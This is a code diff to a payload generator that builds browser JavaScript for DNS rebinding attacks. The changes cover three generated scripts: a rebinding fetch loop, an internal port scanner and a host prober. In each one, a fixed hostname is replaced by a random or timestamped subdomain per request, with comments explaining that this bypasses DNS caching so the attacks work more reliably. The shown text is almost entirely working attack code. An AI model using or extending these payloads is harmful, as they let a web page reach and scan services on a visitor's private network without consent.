@@ -114,8 +114,7 @@ class PayloadGenerator:
         attemptIntervalMs: 1000
     }};
     
-    const domain = window.location.hostname;
-    const targetUrl = 'http://' + domain + ':' + CONFIG.targetPort + CONFIG.targetPath;
+    const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
     
     const status = document.getElementById('status');
     const log = document.getElementById('log');
@@ -132,6 +131,9 @@ class PayloadGenerator:
     }}
     
     async function tryRebind(attempt) {{
+        // Fresh subdomain each attempt to bypass DNS cache
+        const uniqueHost = 'r' + Math.random().toString(36).slice(2) + '.' + baseDomain;
+        const targetUrl = 'http://' + uniqueHost + ':' + CONFIG.targetPort + CONFIG.targetPath;
         addLog('Attempt ' + attempt + ': Fetching ' + targetUrl);
         
         try {{
@@ -246,7 +248,7 @@ class PayloadGenerator:
         timeoutMs: 2000
     }};
     
-    const domain = window.location.hostname;
+    const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
     const results = document.getElementById('results');
     const status = document.getElementById('status');
     
@@ -260,7 +262,9 @@ class PayloadGenerator:
     
     async function checkPort(port) {{
         const row = document.getElementById('port-' + port);
-        const url = 'http://' + domain + ':' + port + '/';
+        // Fresh subdomain each request to bypass DNS cache
+        const uniqueHost = 'r' + Math.random().toString(36).slice(2) + '.' + baseDomain;
+        const url = 'http://' + uniqueHost + ':' + port + '/';
         
         try {{
             const controller = new AbortController();
@@ -373,7 +377,7 @@ class PayloadGenerator:
         timeoutMs: 2000
     }};
     
-    const domain = window.location.hostname;
+    const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
     const logEl = document.getElementById('log');
     const status = document.getElementById('status');
     const hostsEl = document.getElementById('hosts');
@@ -391,8 +395,8 @@ class PayloadGenerator:
     async function probe() {{
         scanNum++;
         // Use unique subdomain to force new DNS lookup each time
-        const subdomain = 'scan' + scanNum + '-' + Date.now();
-        const url = 'http://' + subdomain + '.' + domain + ':' + CONFIG.port + '/';
+        const uniqueHost = 'scan' + scanNum + '-' + Date.now() + '.' + baseDomain;
+        const url = 'http://' + uniqueHost + ':' + CONFIG.port + '/';
         
         try {{
             const controller = new AbortController();
